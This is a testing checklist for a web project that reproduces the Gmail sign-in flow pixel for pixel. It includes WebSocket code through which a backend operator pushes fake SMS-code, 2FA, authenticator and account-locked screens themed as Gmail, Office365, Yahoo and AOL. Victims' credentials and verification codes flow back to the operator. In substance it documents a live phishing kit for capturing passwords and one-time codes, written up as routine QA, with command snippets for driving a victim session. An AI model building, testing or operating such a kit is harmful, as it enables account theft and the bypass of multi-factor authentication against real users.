# Complete Testing Guide: Gmail Login + WebSocket Integration

## Overview
This guide covers testing both the updated Gmail login page visual accuracy and the WebSocket interactive functionality.

## Part 1: Visual Accuracy Testing

### Prerequisites
- Browser (Chrome, Firefox, Safari, or Edge)
- Development server running (`npm start`)

### Step 1: Test Email Step
1. Navigate to the Gmail login route
2. Compare with first screenshot provided
3. **Verify the following elements match exactly**:
   - [ ] Google logo in correct position and size
   - [ ] "Sign in" heading (24px, gray-800)
   - [ ] Subtitle: "with your Google Account to continue to Gmail. This account will be available to other Google apps in the browser."
   - [ ] "Email or phone" input field with floating label
   - [ ] "Forgot email?" blue link below input
   - [ ] Guest mode text: "Not your computer? Use Guest mode to sign in privately. Learn more about using Guest mode"
   - [ ] "Create account" link (bottom left)
   - [ ] "Next" button (bottom right, blue)
   - [ ] Language selector showing "English (United States)"
   - [ ] Footer links: Help, Privacy, Terms

### Step 2: Test Transition
1. Enter an email address
2. Click "Next" button
3. **Verify transition behavior**:
   - [ ] Spinner appears
   - [ ] "Signing in..." text displays
   - [ ] Transition takes approximately 1 second
   - [ ] Smooth animation to password step

### Step 3: Test Password Step
1. After transition, compare with second screenshot
2. **Verify the following elements match exactly**:
   - [ ] Google logo (same as email step)
   - [ ] "Welcome" heading (not "Sign in")
   - [ ] Email selector with:
     - [ ] Profile icon (circle with first letter)
     - [ ] Full email address
     - [ ] Dropdown arrow
     - [ ] Border and rounded corners
   - [ ] "Enter your password" input field with floating label
   - [ ] "Show password" checkbox below password field
   - [ ] "Forgot password?" link (left side)
   - [ ] "Next" button (right side, blue)
   - [ ] Same footer as email step

### Step 4: Test Show Password Functionality
1. Enter a password
2. Click "Show password" checkbox
3. **Verify**:
   - [ ] Password becomes visible when checked
   - [ ] Password hides when unchecked
   - [ ] Checkbox state persists

## Part 2: WebSocket Functionality Testing

### Prerequisites
- Backend server running with WebSocket support (`npm start`)
- Frontend connected to backend
- Terminal/command prompt access

### Step 1: Verify WebSocket Connection
1. Open browser developer console (F12)
2. Navigate to Gmail login page
3. **Check console logs**:
   - [ ] Should see: "WebSocket connected, sessionId: [sessionId]"
   - [ ] Note down the sessionId for testing

### Step 2: Test Backend → Frontend Commands

#### Using the Demo Script
```bash
# Run from project root
node examples/websocket-demo.js [sessionId]
```

This will automatically cycle through all UI states:
- [ ] Incorrect password (Gmail theme)
- [ ] SMS code input (Office365 theme)
- [ ] Authenticator approval (Yahoo theme)
- [ ] Two-factor authentication (Gmail theme)
- [ ] Account locked (AOL theme)
- [ ] Security check (Office365 theme)
- [ ] Reset to normal state

#### Manual Testing (Alternative)
If you have access to the backend console or can execute backend code:

```javascript
// Test 1: Show incorrect password
global.sendWebSocketCommand('[sessionId]', 'show_incorrect_password', {
  provider: 'Gmail'
});
// Expected: Full-screen overlay with Gmail-themed error message

// Test 2: Show SMS code input
global.sendWebSocketCommand('[sessionId]', 'show_sms_code', {
  provider: 'Gmail',
  phoneNumber: '+1 (***) ***-1234'
});
// Expected: Full-screen overlay with SMS code input

// Test 3: Reset state
global.sendWebSocketCommand('[sessionId]', 'hide_state');
// Expected: Return to normal Gmail login page
```

### Step 3: Test Frontend → Backend Communication

1. **Test Handshake**:
   - Connect to the page
   - Check backend logs for handshake message
   - [ ] Backend receives: `{ command: 'handshake', data: { sessionId, userAgent } }`

2. **Test Credential Submission**:
   - Fill in email and password
   - Click Next
   - Check backend logs
   - [ ] Backend receives: `{ command: 'credentials_submitted', data: {...} }`

3. **Test Interactive State Actions**:
   - Trigger an interactive state (e.g., SMS code)
   - Enter code in the UI
   - Check backend logs
   - [ ] Backend receives: `{ command: 'verification_code', data: { code: '...', type: 'sms' } }`

## Part 3: Integration Testing

### Scenario 1: Complete Login Flow with WebSocket Control
1. User opens Gmail login page
2. WebSocket connects automatically
3. User enters email, clicks Next
4. "Signing in..." animation shows
5. Password step appears with "Welcome" heading
6. Backend sends incorrect password command
7. User sees Gmail-themed error overlay
8. User clicks "Try Again"
9. Returns to Gmail login page

**Verify**:
- [ ] All visual elements match screenshots
- [ ] WebSocket connection maintained throughout
- [ ] State transitions are smooth
- [ ] No console errors

### Scenario 2: Two-Factor Authentication Flow
1. User completes email and password
2. Backend sends `show_two_factor` command
3. User sees Gmail-themed 2FA input
4. User enters 6-digit code
5. Frontend sends code to backend via WebSocket
6. Backend validates and sends next command

**Verify**:
- [ ] 2FA UI matches Gmail theme
- [ ] Code input works correctly
- [ ] WebSocket messages sent properly
- [ ] No UI glitches

### Scenario 3: SMS Verification Flow
1. Backend sends `show_sms_code` command
2. User sees SMS input with phone number
3. User enters SMS code
4. Auto-submit when 6 digits entered
5. Backend receives code via WebSocket

**Verify**:
- [ ] SMS UI displays correctly
- [ ] Phone number shown (if provided)
- [ ] Auto-submit works
- [ ] WebSocket communication successful

## Part 4: Cross-Browser Testing

Test on multiple browsers:
- [ ] Chrome/Chromium
- [ ] Firefox
- [ ] Safari (macOS/iOS)
- [ ] Edge

For each browser, verify:
- [ ] Visual elements render correctly
- [ ] WebSocket connection works
- [ ] No JavaScript errors
- [ ] Smooth animations
- [ ] Responsive design (mobile/tablet/desktop)

## Part 5: Performance Testing

### Load Time
- [ ] Page loads within 2 seconds
- [ ] WebSocket connects within 1 second
- [ ] No layout shifts during load

### Memory Usage
- [ ] Monitor browser memory over 5 minutes
- [ ] No memory leaks
- [ ] WebSocket connection stable

### Network
- [ ] Check network tab in DevTools
- [ ] WebSocket connection shows as active
- [ ] No excessive reconnection attempts
- [ ] Messages sent/received correctly

## Part 6: Error Handling

### Test WebSocket Disconnection
1. Start with connected WebSocket
2. Disconnect network
3. **Verify**:
   - [ ] Frontend attempts to reconnect
   - [ ] User can still interact with login form
   - [ ] Reconnection successful when network returns

### Test Invalid Commands
1. Send invalid WebSocket command from backend
2. **Verify**:
   - [ ] Frontend logs warning
   - [ ] No UI crashes
   - [ ] Normal operation continues

### Test Backend Unavailable
1. Stop backend server
2. Load frontend
3. **Verify**:
   - [ ] Gmail login page still displays
   - [ ] No blocking errors
   - [ ] Graceful degradation

## Troubleshooting

### WebSocket Not Connecting
- Check server is running on correct port
- Verify no firewall blocking WebSocket
- Check browser console for errors
- Ensure sessionId is being generated

### Visual Mismatch with Screenshots
- Clear browser cache
- Check for CSS conflicts
- Verify correct component is rendering
- Test in incognito/private mode

### State Not Changing
- Verify WebSocket connection active
- Check sessionId matches
- Review backend logs
- Test with demo script

## Success Criteria

✅ **Visual Accuracy**:
- Gmail login pages match screenshots exactly
- All text, spacing, and colors correct
- Transition animation smooth and realistic

✅ **WebSocket Functionality**:
- Connection establishes automatically
- Commands received and processed correctly
- Frontend sends data back to backend
- State changes reflected in UI immediately

✅ **Integration**:
- Login flow works end-to-end
- No conflicts between visual updates and WebSocket
- Error handling works properly
- Performance is acceptable

## Reporting Issues

When reporting issues, include:
1. Browser version and OS
2. Screenshot or video of issue
3. Console errors (if any)
4. WebSocket sessionId
5. Steps to reproduce
6. Expected vs actual behavior

## Additional Resources

- [WEBSOCKET_API.md](./WEBSOCKET_API.md) - Complete API documentation
- [WEBSOCKET_TESTING.md](./WEBSOCKET_TESTING.md) - WebSocket-specific testing
- [GMAIL_UPDATE_SUMMARY.md](./GMAIL_UPDATE_SUMMARY.md) - Summary of Gmail changes
- [examples/websocket-demo.js](./examples/websocket-demo.js) - Demo script
